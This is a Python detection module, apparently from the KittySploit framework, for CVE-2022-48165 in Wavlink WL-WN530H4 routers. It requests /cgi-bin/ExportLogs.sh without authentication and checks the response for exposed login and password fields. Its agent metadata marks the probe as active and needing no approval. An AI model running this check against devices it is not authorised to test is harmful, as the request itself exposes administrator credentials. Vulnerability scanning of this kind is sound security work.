#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Wavlink WL-WN530H4 M30H4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wavlink - Improper Access Control Detection',
        'description': 'Wavlink WL-WN530H4 M30H4.V5030.210121 is susceptible to improper access control in the component /cgi-bin/ExportLogs.sh. An attacker can download configuration data and log files, obtain admin credentials, and potentially execute unauthorized operations.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wavlink', 'router', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://docs.google.com/document/d/1HD4GKumkZpa6FNHuf0QQSKFvoYhCfwXpbyWiJdx1VtE',
            'https://twitter.com/For3stCo1d/status/1622576544190464000',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-48165',
            'https://github.com/strik3r0x1/Vulns/blob/main/WAVLINK_WL-WN530H4.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-48165',
        ],
        'cve': 'CVE-2022-48165',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/ExportLogs.sh', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('Password=', 'Login=',)
        header_any = ('filename="sysLogs.txt"',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Wavlink - Improper Access Control detected",
                path='/cgi-bin/ExportLogs.sh',
            )
            return True
        return False

